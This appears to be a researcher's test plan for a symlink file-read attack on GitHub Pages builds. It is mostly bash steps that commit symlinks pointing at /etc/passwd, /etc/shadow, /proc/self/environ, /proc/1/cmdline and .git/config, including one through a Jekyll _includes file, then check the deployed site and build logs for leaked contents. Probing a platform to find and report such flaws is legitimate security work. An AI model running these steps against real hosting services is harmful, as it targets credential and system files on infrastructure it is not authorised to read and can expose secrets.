# VECTOR 1: Symlink File Read (Build-time Dereference)

## Hypothesis
GitHub Pages dereferences symlinks during build. If a symlink points to a file
OUTSIDE the repo working directory, and the build system reads it, the content
may appear in the deployed site = arbitrary file read.

## Test A: Basic symlink to /etc/passwd

```bash
cd pages-security-test/
ln -s /etc/passwd passwd-link.html
echo '<a href="/passwd-link.html">test</a>' > index.html
git add index.html
# Symlinks need special handling in git:
git add passwd-link.html
git commit -m "vector1a: symlink to /etc/passwd"
git push
```

After build, check: https://YOUR_USER.github.io/pages-security-test/passwd-link.html

## Test B: Symlink to build environment files

```bash
ln -s /proc/self/environ environ-link.txt
ln -s /proc/1/cmdline cmdline-link.txt
ln -s ../../../.git/config gitconfig-link.txt
ln -s /etc/hostname hostname-link.txt
git add -A
git commit -m "vector1b: symlinks to build env"
git push
```

## Test C: Symlink inside _includes (Jekyll path)

```bash
mkdir -p _includes
ln -s /etc/passwd _includes/secrets.html
cat > index.html << 'EOF'
---
---
{% include secrets.html %}
EOF
git add -A
git commit -m "vector1c: symlink in _includes"
git push
```

## Test D: Relative symlink traversal

```bash
mkdir -p deep/nested/dir
ln -s ../../../../../../etc/shadow deep/nested/dir/shadow.txt
git add -A
git commit -m "vector1d: relative traversal symlink"
git push
```

## Expected results
- If build FAILS with "symlink does not exist" → GitHub strips symlinks (mitigated)
- If build SUCCEEDS and file content appears → VULNERABILITY (file read)
- If build succeeds but file is EMPTY → dereference happens but sandboxed (partial)

## Oracle
Check the deployed site AND the build log in Actions tab.
Compare: does the content match what's on the build host?
